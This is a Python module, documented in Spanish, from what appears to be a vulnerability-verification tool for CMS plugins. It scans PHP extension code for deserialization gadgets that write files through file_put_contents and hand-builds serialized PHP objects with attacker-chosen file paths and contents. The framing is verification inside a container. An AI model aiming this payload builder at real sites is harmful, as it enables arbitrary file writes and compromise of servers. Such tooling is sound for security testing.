"""Escaneo de gadgets de deserializacion insegura (PHP Object Injection) -- CMS-agnostico,
compartido por wpverify.py/drupalverify.py/joomlaverify.py.

Por que esto y no una lista de payloads fija: una cadena de gadgets de deserializacion SOLO
funciona si las CLASES que usa existen de verdad en el objetivo (igual que en pentesting real --
herramientas como PHPGGC generan payloads para clases de librerias CONOCIDAS como Laravel/Symfony/
Monolog/Guzzle, nunca "a ciegas"). binoracle ya tiene el codigo real del plugin/modulo/extension
descargado ANTES de verificar nada (ver websource.py) -- asi que, en vez de asumir una libreria de
terceros que puede no estar ahi, esto busca un gadget DENTRO DEL PROPIO CODIGO de la extension: una
clase con un metodo magico (__wakeup/__destruct) que escribe una propiedad controlada por el
atacante a un fichero, tambien controlado por el atacante (`file_put_contents($this->X, $this->Y)`
es el patron mas comun y el unico que esto busca por ahora). Esto es un escenario real: muchos
plugins/modulos traen su propia clase de cache/log que hace justo esto.

Alcance deliberadamente estrecho ("no false positives" es la regla del proyecto):
  - Solo propiedades PUBLICAS (evita la complejidad de los nombres de propiedad "mangled" que PHP
    usa para serializar propiedades private/protected -- \0Clase\0nombre / \0*\0nombre).
  - Solo el patron de dos argumentos file_put_contents(ruta, contenido) -- no fwrite/copy/system/
    etc. todavia.
  - Deteccion por regex + conteo de llaves, no un parser PHP real -- igual de "laxo a proposito"
    que grep_vulnerable_functions() en websource.py: el objetivo es encontrar un gadget REAL, no
    parsear el lenguaje completo.
  - Si no encuentra nada, no inventa nada: el caller debe reportarlo como bloqueo, nunca como
    'verificado'.

La prueba dura de verdad pasa DESPUES de encontrar el gadget (ver wpverify.py/drupalverify.py/
joomlaverify.py): se construye el objeto serializado de verdad, se envia al endpoint, y se
confirma leyendo el fichero REAL dentro del contenedor -- igual que el patron de fichero canario
de path-traversal/XXE, reutilizado aqui como el "destino" de la escritura del gadget."""
from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from typing import List, Optional

_SCAN_EXT = (".php",)
_MAX_FILES = 3000
_MAX_FILE_BYTES = 1_500_000


@dataclass
class DeserializationGadget:
    class_name: str
    namespace: str              # "" si no hay namespace (PHP global)
    magic_method: str           # "__wakeup" o "__destruct"
    path_prop: str               # propiedad PUBLICA usada como ruta del fichero
    content_prop: str            # propiedad PUBLICA usada como contenido del fichero
    file: str
    line: int

    @property
    def full_class_name(self) -> str:
        return f"{self.namespace}\\{self.class_name}" if self.namespace else self.class_name


def _find_matching_brace(text: str, open_pos: int) -> int:
    """Indice de la '}' que cierra la '{' en `open_pos`. Conteo simple de llaves -- no ignora
    llaves dentro de strings/comentarios (heuristica, igual que el resto del proyecto); si algo
    sale mal, devuelve len(text) (trata el resto del fichero como el cuerpo, seguro por exceso)."""
    depth = 0
    i = open_pos
    n = len(text)
    while i < n:
        c = text[i]
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return n


_CLASS_RE = re.compile(r"\bclass\s+(\w+)\b[^{]*\{")
_NAMESPACE_RE = re.compile(r"^\s*namespace\s+([\w\\]+)\s*;", re.M)
_MAGIC_METHOD_RE = re.compile(r"\bfunction\s+(__wakeup|__destruct)\s*\([^)]*\)\s*\{")
_FILE_PUT_CONTENTS_RE = re.compile(
    r"file_put_contents\s*\(\s*\$this->(\w+)\s*,\s*\$this->(\w+)\s*\)")


def _public_prop_declared(class_body: str, prop: str) -> bool:
    return bool(re.search(rf"\bpublic\s+(?:\??[\w|]+\s+)?\${re.escape(prop)}\b", class_body))


def find_file_write_gadget(root: str) -> Optional[DeserializationGadget]:
    """Busca, en TODO el arbol de `root` (el codigo real ya descargado del plugin/modulo/
    extension), la primera clase con un __wakeup()/__destruct() que escriba una propiedad publica
    a una ruta tambien publica via file_put_contents($this->X, $this->Y). Devuelve None si no
    encuentra nada -- el caller NUNCA debe inventar un gadget que no esta."""
    scanned = 0
    for dirpath, _dirs, files in os.walk(root):
        for fn in files:
            if not fn.lower().endswith(_SCAN_EXT):
                continue
            scanned += 1
            if scanned > _MAX_FILES:
                return None
            fpath = os.path.join(dirpath, fn)
            try:
                if os.path.getsize(fpath) > _MAX_FILE_BYTES:
                    continue
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read()
            except OSError:
                continue

            ns_m = _NAMESPACE_RE.search(text)
            namespace = ns_m.group(1) if ns_m else ""

            # rangos [start, end) de cada clase del fichero, para saber a que clase pertenece
            # cada metodo magico encontrado despues.
            class_ranges = []
            for cm in _CLASS_RE.finditer(text):
                body_start = cm.end() - 1   # posicion de la '{' que abre el cuerpo
                body_end = _find_matching_brace(text, body_start)
                class_ranges.append((cm.group(1), cm.start(), body_end))

            for mm in _MAGIC_METHOD_RE.finditer(text):
                method_body_start = mm.end() - 1
                method_body_end = _find_matching_brace(text, method_body_start)
                method_body = text[method_body_start:method_body_end]
                fm = _FILE_PUT_CONTENTS_RE.search(method_body)
                if not fm:
                    continue
                path_prop, content_prop = fm.group(1), fm.group(2)
                # a que clase pertenece esta posicion (la ultima clase cuyo rango la contiene --
                # cubre el caso comun de una clase por fichero, y el de varias no anidadas).
                owner = None
                for cname, cstart, cend in class_ranges:
                    if cstart <= mm.start() < cend:
                        owner = (cname, cstart, cend)
                if owner is None:
                    continue
                cname, cstart, cend = owner
                class_body = text[cstart:cend]
                if not (_public_prop_declared(class_body, path_prop)
                       and _public_prop_declared(class_body, content_prop)):
                    continue
                line = text.count("\n", 0, mm.start()) + 1
                rel = os.path.relpath(fpath, root)
                return DeserializationGadget(
                    class_name=cname, namespace=namespace, magic_method=mm.group(1),
                    path_prop=path_prop, content_prop=content_prop, file=rel, line=line)
    return None


def build_php_serialized_object(gadget: DeserializationGadget, path_value: str,
                                content_value: str) -> str:
    """Construye el objeto PHP serializado de verdad para `gadget`, con sus DOS propiedades
    publicas puestas a los valores que el atacante elige -- esto es exactamente lo que
    unserialize() en el objetivo reconstruira (mismo formato que genera PHP's serialize(), a
    mano). Solo propiedades publicas (ver docstring del modulo): se serializan por su nombre
    literal, sin el prefijo NUL que usan private/protected."""
    cls = gadget.full_class_name
    props = [(gadget.path_prop, path_value), (gadget.content_prop, content_value)]
    parts = [f'O:{len(cls)}:"{cls}":{len(props)}:{{']
    for name, value in props:
        parts.append(f's:{len(name)}:"{name}";s:{len(value.encode("utf-8"))}:"{value}";')
    parts.append("}")
    return "".join(parts)
